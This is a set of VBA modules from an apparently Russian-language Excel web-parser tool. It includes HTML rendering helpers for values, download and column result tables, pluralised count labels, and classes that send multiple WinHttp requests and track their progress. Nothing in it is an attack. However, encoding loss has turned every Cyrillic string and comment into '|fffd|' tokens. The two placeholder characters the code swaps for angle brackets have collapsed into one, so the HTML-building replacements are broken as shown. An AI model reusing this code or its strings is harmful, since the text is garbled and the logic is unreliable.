            TEXTAREA_HTML$ = "|fffd|code rows=""" & MaxArrayItemsCount& & """ class=""aa-value""|fffd|XXX|fffd|/code|fffd|"
        End If
        
        OutputHTML$ = ValueType$ & Replace(TEXTAREA_HTML$, "XXX", FormattedValue$)
        
        
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If IsURL(txt) Then
            ValueType$ = "|fffd|a href=""" & txt & """ rel=""nofollow"" target=""_blank""|fffd||fffd||fffd||fffd||fffd||fffd||fffd|:|fffd|/a|fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & br$
            OutputHTML$ = ValueType$ & Replace(IIf(Len(txt) < 50, TEXTFIELD_HTML$, TEXTAREA_HTML$), "XXX", txt)
        Else
            '            If Len(txt) < 50 Then
            '                ValueDescription = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & txt
            '            Else
            ValueType$ = IIf(txt Like "*<?*>*</?*>*", "|fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|")
            ValueType$ = IIf(txt Like "*<html*<head*</head>*<body*</body>*</html>*", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", ValueType$)
            If Len(txt) Then If txt Like String(Len(txt), "#") Then ValueType$ = "|fffd||fffd||fffd||fffd||fffd|"
            
            ValueType$ = "|fffd|strong|fffd|" & ValueType$ & "|fffd|/strong|fffd| (" & CharsCountTXT(Len(txt)) & ")" & br$
            
            If (txt Like "http*") Or (txt Like "*" & vbNewLine & "http*") Then
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| code |fffd||fffd||fffd||fffd||fffd||fffd| textarea
                TEXTAREA_HTML$ = "|fffd|code|fffd|XXX|fffd|/code|fffd|"
            End If
            
            OutputHTML$ = ValueType$ & Replace(IIf(Len(txt) < 40, TEXTFIELD_HTML$, TEXTAREA_HTML$), "XXX", txt)
            
            If txt = "" Then OutputHTML$ = IIf(LargeFields, "|fffd|span style=""color: #ccc;""|fffd|<|fffd||fffd||fffd||fffd||fffd|>|fffd|/span|fffd|", "(|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)")
        End If
    End If
    
    If WithoutChanges Then OutputHTML$ = ValueType$ & "|fffd|span style=""color: #00F;""|fffd|<|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>|fffd|/span|fffd|"
    
    OutputHTML$ = Replace(Replace(OutputHTML$, ">", "&gt;"), "<", "&lt;")
    OutputHTML$ = Replace(Replace(OutputHTML$, "|fffd|", ">"), "|fffd|", "<")
   
    ValueDescriptionHTML = OutputHTML$
End Function

Function Value_ShortHTML(ByVal txt$) As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML
    Value_ShortHTML = Replace(Replace(txt$, ">", "&gt;"), "<", "&lt;")
End Function

Function ValueDescription_SimpleHTML(ByVal txt$) As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML
    On Error Resume Next
    Dim ValueType$, FormattedValue$, OutputHTML$, PRE_HTML$, i&, arr, TEXTAREA_HTML$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| - |fffd| Alt + 8249, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| - |fffd| Alt + 8250
    Const br$ = "|fffd|br /|fffd|", MaxArrayItemsCount& = 3
    PRE_HTML$ = "|fffd|pre class=""aa-value""|fffd|XXX|fffd|/pre|fffd|"
    
    txt = Replace(txt, TEMP_ARSEP$, ARSEP)
    
    If InStr(1, txt, ARSEP, vbTextCompare) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd|
        
        OutputHTML$ = ValueType$ & Replace(PRE_HTML$, "XXX", Replace(txt, ARSEP, "|fffd|br /|fffd|"))
        
        '        ValueType$ = "|fffd|strong|fffd||fffd||fffd||fffd||fffd||fffd||fffd|/strong|fffd| |fffd||fffd| " & UBound(Split(txt, ARSEP)) + 1 & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & br$
        '
        '        arr = "": arr = Split(txt, ARSEP)
        '        If UBound(arr) <= MaxArrayItemsCount& Then
        '            FormattedValue$ = Replace(txt, ARSEP, vbNewLine)
        '        Else
        '            For i = LBound(arr) To MaxArrayItemsCount& - 1
        '                FormattedValue$ = FormattedValue$ & IIf(FormattedValue$ = "", "", vbNewLine) & arr(i)
        '            Next i
        '            FormattedValue$ = FormattedValue$ & vbNewLine & "... (|fffd||fffd||fffd| " & ItemsCountTXT(UBound(arr) + 1 - MaxArrayItemsCount&) & ")"
        '        End If
        '
        '        If Len(FormattedValue$) > 1000 Then
        '            '            ValueType$ = ValueType$ & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & CharsCountTXT(Len(txt)) & ")" & BR$
        '        End If
        '        OutputHTML$ = ValueType$ & Replace(PRE_HTML$, "XXX", FormattedValue$)
        
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        OutputHTML$ = ValueType$ & Replace(PRE_HTML$, "XXX", txt)
        If txt = "" Then OutputHTML$ = "(|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"
    End If
    
    OutputHTML$ = Replace(Replace(OutputHTML$, ">", "&gt;"), "<", "&lt;")
    OutputHTML$ = Replace(Replace(OutputHTML$, "|fffd|", ">"), "|fffd|", "<")
    
    ValueDescription_SimpleHTML = OutputHTML$
End Function

Function Text2HTMLField(ByRef txt$) As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| INPUT |fffd||fffd||fffd| TEXTAREA
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ValueDescriptionHTML
    On Error Resume Next: Dim OutputHTML$, w&
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| - |fffd| Alt + 8249, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| - |fffd| Alt + 8250
    Const TEXTFIELD_HTML$ = "|fffd|input readonly class=""result-inline-value"" style=""width: WWWem;"" type=""text"" value=""XXX"" /|fffd|"
    Const TEXTAREA_HTML$ = "|fffd|br /|fffd||fffd|textarea readonly rows=""3"" class=""result-inline-value""|fffd|XXX|fffd|/textarea|fffd|"
    Const br$ = "|fffd|br /|fffd|"
    txt = Replace(Replace(txt, vbCr, " "), vbLf, " ")
    w& = Application.max(8, Application.min(40, (Len(txt) * 1.03 + 9) \ 2))
    OutputHTML$ = Replace(IIf(Len(txt) < 80, Replace(TEXTFIELD_HTML$, "WWW", w&), TEXTAREA_HTML$), "XXX", txt)
    OutputHTML$ = Replace(Replace(OutputHTML$, ">", "&gt;"), "<", "&lt;")
    Text2HTMLField = Replace(Replace(OutputHTML$, "|fffd|", ">"), "|fffd|", "<")
End Function

Function CharsCountTXT(ByVal n&) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 4 |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| N
    Dim txt$
    Select Case n
        Case 0: CharsCountTXT = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        Case 11 To 19: txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case Else
            Select Case n Mod 10
                Case 1: txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 2 To 4: txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case Else: txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End Select
    End Select
    CharsCountTXT = "|fffd||fffd||fffd||fffd||fffd||fffd| " & n& & " " & txt$
End Function

Function ItemsCountTXT(ByVal n&) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|4 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| N
    Dim txt$
    Select Case n
        Case 0: ItemsCountTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        Case 11 To 19: txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case Else
            Select Case n Mod 10
                Case 1: txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 2 To 4: txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case Else: txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End Select
    End Select
    ItemsCountTXT = n& & " " & txt$
End Function

'Sub AddSpecialRowIntoHTMLDescription(ByVal RowType&, ByVal ActionText$, ByVal OutputValue$)
'    On Error Resume Next
'    Dim txt$, action_name$, result_column$
'    action_name$ = vbTab & vbTab & "<td class=""action-name"" style=""width: 50%;"">" & ActionText$ & "</td>" & vbNewLine
'    result_column$ = vbTab & vbTab & "<td class=""result-value"" style=""width: 50%;""><!--noindex-->" & ValueDescriptionHTML(OutputValue$) & _
    '                     "<!--/noindex--></td>" & vbNewLine
'
'    txt = "<table class=""ArrayActions table-type-" & RowType& & """>" & vbNewLine & "<tbody>" & _
    '          vbTab & "<tr class=""row-type-" & RowType& & """>" & vbNewLine & action_name$ & vbTab & vbTab & vbNewLine & result_column$ & vbTab & _
    '          "</tr>" & vbNewLine & "</tbody>" & vbNewLine & "</table>"
'
'    DescriptionText = DescriptionText & txt
'
'
'    '    Dim AA As New ArrayAction
'    '    AA.Name = ActionText$
'    '    DescriptionText = DescriptionText & "<table class=""ArrayActions table-type-" & RowType& & """>" & vbNewLine & "<tbody>" & _
    '         '                      AA.PublishHTML_GetActionHTMLRow(ValueDescriptionHTML(TextValue$), RowType&) & "</tbody>" & vbNewLine & "</table>"
'    '    Set AA = Nothing
'End Sub

Sub PublishHTML_ShowDownload(ByVal DownloadURL$, ByVal FileName$, ByVal Folder$, Optional ByRef PD As ParserDownload)
    On Error Resume Next: Dim text1$, text2$, text3$
    
    text1$ = "<strong><a href=""" & DownloadURL$ & """  rel=""nofollow"" target=""_blank"" class=""parser-download-url"">" & _
        "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|</a> |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|</strong>, " & _
        "<br />|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & Text2HTMLField(FileName$) & "<br />" & vbNewLine & _
        "|fffd| |fffd||fffd||fffd||fffd||fffd| " & Text2HTMLField(Folder$)
    
    text2$ = "<img src=""" & DownloadURL$ & """ alt=""|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"" class=""parser-download-image"" height=""50"">"
    
    With PD
        text3$ = "<strong>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:</strong><br />"
        Select Case PD.FilenameMode
            Case dfm_Auto
                text3$ = text3$ & "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)<br />"
            Case dfm_UseMask
                text3$ = text3$ & "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & Text2HTMLField(.FilenameMask) & "<br />"
        End Select
        text3$ = text3$ & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Text2HTMLField(.Folder)
    End With
    
    DescriptionText = DescriptionText & "<div class=""parser-download-result"">" & vbNewLine & _
        vbTab & "<table class=""parser-download-result""><tbody>" & vbNewLine & vbTab & vbTab & "<tr>" & vbNewLine & _
        vbTab & vbTab & "<td style=""width: 40%;"">" & vbNewLine & vbTab & vbTab & vbTab & _
        "<div class=""parser-download-result-description"">" & _
        vbNewLine & text1$ & vbNewLine & vbTab & vbTab & vbTab & "</div>" & vbNewLine & vbTab & vbTab & "</td>" & vbNewLine & _
        vbTab & vbTab & "<td style=""width: 10%;"">" & vbNewLine & vbTab & vbTab & vbTab & _
        "<div class=""parser-download-result-file"">" & _
        vbNewLine & text2$ & vbNewLine & vbTab & vbTab & vbTab & "</div>" & vbNewLine & vbTab & vbTab & "</td>" & vbNewLine & _
        vbTab & vbTab & "<td style=""width: 50%;"">" & vbNewLine & vbTab & vbTab & vbTab & _
        "<div class=""parser-download-parameters"">" & _
        vbNewLine & text3$ & vbNewLine & vbTab & vbTab & vbTab & "</div>" & vbNewLine & vbTab & vbTab & "</td>" & vbNewLine & _
        vbTab & vbTab & "</tr>" & vbNewLine & vbTab & "</tbody></table>" & vbNewLine & "</div>"
    
End Sub

Sub PublishHTML_ShowColumnValue(ByVal OutputValue$, ByRef cell As Range, ByVal IsHyperlink As Boolean, Optional ByRef OC As OutputColumn, _
        Optional ByVal ScreenTip$, Optional ByVal TextToDisplay$)
    On Error Resume Next: Dim text1$, text3$
    
    With OC
        text3$ = "<strong>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(.Column) & ":</strong><br />"
        If OC.Format.HyperlinkEnable Then
            text3$ = text3$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:<br />"
            text3$ = text3$ & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (URL): " & Text2HTMLField(.Format.HyperlinkURL) & "<br />"
            text3$ = text3$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Text2HTMLField(.Format.HyperlinkTextToDisplay) & "<br />"
            text3$ = text3$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Text2HTMLField(.Format.HyperlinkScreenTip) & "<br />"
        Else
            text3$ = text3$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)<br />"
            text3$ = text3$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & IIf(.Format.WrapText, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") & "<br />"
        End If
        
        If IsHyperlink Then
            If TextToDisplay = "" Then TextToDisplay = OutputValue$
            text1$ = "<strong>|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0) & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</strong> <div class=""parser-cell-url"">" & _
                "<a href=""" & OutputValue$ & """  rel=""nofollow"" target=""_blank"" class=""parser-cell-url"">" & _
                TextToDisplay & "</a></div><div style=""clear: both;""></div><br />"
            text1$ = text1$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Text2HTMLField(ScreenTip) & "<br />"
        Else
            text1$ = "<strong>|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0) & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</strong> " & Text2HTMLField(OutputValue$) & "<br />"
        End If
        
    End With
    
    DescriptionText = DescriptionText & "<div class=""parser-output-column-result"">" & vbNewLine & _
        vbTab & "<table class=""parser-output-column-result""><tbody>" & vbNewLine & vbTab & vbTab & "<tr>" & vbNewLine & _
        vbTab & vbTab & "<td style=""width: 50%;"">" & vbNewLine & vbTab & vbTab & vbTab & _
        "<div class=""parser-output-column-result-description"">" & _
        vbNewLine & text1$ & vbNewLine & vbTab & vbTab & vbTab & "</div>" & vbNewLine & vbTab & vbTab & "</td>" & vbNewLine & _
        vbTab & vbTab & "<td style=""width: 50%;"">" & vbNewLine & vbTab & vbTab & vbTab & _
        "<div class=""parser-output-column-parameters"">" & _
        vbNewLine & text3$ & vbNewLine & vbTab & vbTab & vbTab & "</div>" & vbNewLine & vbTab & vbTab & "</td>" & vbNewLine & _
        vbTab & vbTab & "</tr>" & vbNewLine & vbTab & "</tbody></table>" & vbNewLine & "</div>"
    
End Sub

Attribute VB_Name = "HTTP_Request"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : HTTP_Request                     Version: 1.1
' Author        : Igor Vakhnenko                   Date: 14.06.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Public WithEvents http As WinHttpRequest
Attribute http.VB_VarHelpID = -1

Public Parent As HTTP_Requests
Public ThreadID As String
Public URL As String
Public Response As String
Public Encoding As String
Public Status As Long
Public StartTime As Date

Private Sub Class_Initialize()
    Set http = New WinHttpRequest
End Sub

Private Sub Class_Terminate()
    'Debug.Print "ThreadID " & ThreadID & " destroyed"
    Set http = Nothing
    Set Parent = Nothing
End Sub

Function IsFrosen(ByRef Timeout As Long) As Boolean
    IsFrosen = ((Now - StartTime) * 86400 >= (Timeout * 1))
End Function

Private Sub http_OnResponseDataAvailable(data() As Byte)
    On Error Resume Next
    'Debug.Print "ThreadID=" & ThreadID, "DataAvailable", "size=" & UBound(Data)
    Response = Response & StrConv(data, vbUnicode)
End Sub

Private Sub http_OnResponseFinished()
    On Error Resume Next
    Me.Parent.Finished Me
End Sub

Private Sub http_OnResponseStart(ByVal Status As Long, ByVal ContentType As String)
    On Error Resume Next
    If Me.Encoding = "" Then
        If ContentType Like "*=utf-8*" Then Me.Encoding = "utf-8"
        If ContentType Like "*1251*" Then Me.Encoding = "windows-1251"
    End If
    Me.Status = Status
    With Me.Parent
        .RequestStarted = .RequestStarted + 1
        Select Case Status
            Case 200 To 399: .RequestStatusOK = .RequestStatusOK + 1
            Case 400 To 599: .RequestStatusFailed = .RequestStatusFailed + 1
            Case Else: Debug.Print "Unsupported Status=" & Status
        End Select
    End With
    'Debug.Print "ThreadID=" & ThreadID, "Status=" & Status, "ContentType=" & ContentType
End Sub
Attribute VB_Name = "HTTP_Requests"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : HTTP_Requests                    Version: 1.1
' Author        : Igor Vakhnenko                   Date: 13.06.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit

Dim Requests As New Dictionary
Dim SourceURLs As New Collection
Public result As New Dictionary
Public SourceURLsAmount As Long

Public Encoding As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public MaxThreads As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Timeout As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public HTML_Filters As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public pi As ProgressIndicatorNew
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public RequestStarted As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public RequestFrozen As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public RequestFinished As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public RequestStatusOK As Long        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| 2xx |fffd||fffd||fffd| 3xx
Public RequestStatusFailed As Long        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| 4xx |fffd||fffd||fffd| 5xx

Private Sub Class_Initialize()
    Me.MaxThreads = 50
    Me.Timeout = DEFAULT_QUERY_TIMEOUT&
End Sub

Private Sub Class_Terminate()
    On Error Resume Next
    Dim H As New HTTP_Request
    For Each H In Requests
        Set H = Nothing
    Next
    Set Requests = Nothing
    Set SourceURLs = Nothing
    Set result = Nothing
End Sub

Function ExecuteAll(ByVal coll As Collection) As Variant
    On Error Resume Next
    Dim i&
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| SourceURLs
    Set SourceURLs = coll
    SourceURLsAmount = SourceURLs.Count

    pi.ShowExtraBar "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & SourceURLsAmount & " URL,  |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Me.MaxThreads & ",  |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Timeout & " |fffd||fffd||fffd|.)", False

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    For i = 1 To Application.min(Me.MaxThreads, SourceURLs.Count)
        'Debug.Print "ind=" & i&, Now
        ExecuteNext
        DoEvents
        UpdateProgressBar
    Next
End Function

Function WaitForResponse(Optional ByVal Timeout&) As Boolean
    On Error Resume Next
    If Timeout& <= 0 Then Timeout& = (SourceURLsAmount / Me.MaxThreads * 1.2 + 2) * Me.Timeout
    Dim i&, TimeStamp As Double: TimeStamp = CDbl(Now) * 86400
    While (Me.RequestFinished < SourceURLsAmount) And (CDbl(Now) * 86400 - TimeStamp < Timeout&)
        If StopMacro Then pi.HideExtraBar: Exit Function
        For i = 1 To 100: DoEvents: Next
        UpdateProgressBar
    Wend
    'UpdateProgressBar
    For i = 1 To 100: DoEvents: Next
    
    'WaitForResponse = Me.RequestFinished = SourceURLsAmount
    WaitForResponse = (Me.RequestFrozen + Me.RequestStatusFailed) = 0
    
    pi.HideExtraBar
End Function

Sub UpdateProgressBar()
    On Error Resume Next
    Static LastPercent&, LastUpdateTime As Date
    If Now - LastUpdateTime < 0.1 / 86400 Then Exit Sub

    Dim line1$, line2$, Started_Percent&, Answered_Percent&, Finished_Percent&, H As HTTP_Request, k
    Finished_Percent& = Fix(Me.RequestFinished / SourceURLsAmount * 100)
    If LastPercent& > Finished_Percent& Then LastPercent& = 0

    Started_Percent& = Fix((SourceURLsAmount - SourceURLs.Count) / SourceURLsAmount * 100)
    Answered_Percent& = Fix(Me.RequestStarted / SourceURLsAmount * 100)


    For Each k In Requests.Keys
        Set H = Requests.item(CStr(k))
        If H.IsFrosen(Timeout) Then
            Me.RequestFrozen = Me.RequestFrozen + 1
            Me.Finished H
        End If
    Next
    Set H = Nothing

    line2$ = IIf(Me.RequestStatusFailed, "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Me.RequestStatusFailed & " / " & SourceURLsAmount, "")
    line2$ = line2$ & IIf(Me.RequestFrozen, IIf(line2$ = "", "", ",  ") & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Me.RequestFrozen & " / " & SourceURLsAmount, "")


    If Me.RequestFrozen Then pi.ExtraBar_SetColor vbMagenta
    If Me.RequestStatusFailed Then pi.ExtraBar_SetColor vbRed

    pi.ExtraBar_SetLineText 2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & SourceURLsAmount - SourceURLs.Count & " / " & SourceURLsAmount & "  (" & Started_Percent& & "%)" _
                               & ",  |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & RequestStarted & " / " & SourceURLsAmount & "  (" & Answered_Percent& & "%)"
